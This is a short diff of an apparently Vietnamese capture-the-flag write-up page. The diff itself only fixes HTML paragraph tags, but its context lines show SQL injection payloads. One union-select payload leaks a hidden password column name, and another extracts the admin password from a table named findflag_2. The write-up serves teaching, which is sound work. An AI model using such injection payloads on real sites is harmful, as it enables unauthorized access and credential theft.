@@ -106,8 +106,8 @@ Mình không chắc chắn cách server xử lý nên để chắc ăn mình s�
 <pre tabindex="0"><code>?id=&#39;+and+0+union+select+1,&amp;pw=3,4,5--+-
 </code></pre><p>Query lúc đó sẽ trở thành:</p>
 <pre tabindex="0"><code>SELECT * FROM findflag_2 WHERE $id_column=&#39;&#39; and 0 union select 1, &#39;and $pw_column=&#39;,3,4,5;
-</code></pre><p>Gửi request đến server và nhận response:
-</p>
+</code></pre><p>Gửi request đến server và nhận response:</p>
+<p></p>
 <p>Như vậy <code>$pw_column=xPw4coaa1sslfe</code>. Biết được tên cột rồi thì mình cần query để dò giá trị mật khẩu của admin.</p>
 <p>Cũng cùng kỹ thuật trên, chúng ta sẽ ép cho truy vấn gốc bị vô hiệu để <code>$query[$id_column]</code> sẽ trả về giá trị thu được từ query. Biết được tên column rồi thì chúng ta thực hiện truy vấn với payload sau.</p>
 <p><code>?id='+and+0+union+select+1,(select+xPw4coaa1sslfe+from+findflag_2),3,4,5--+-</code></p>
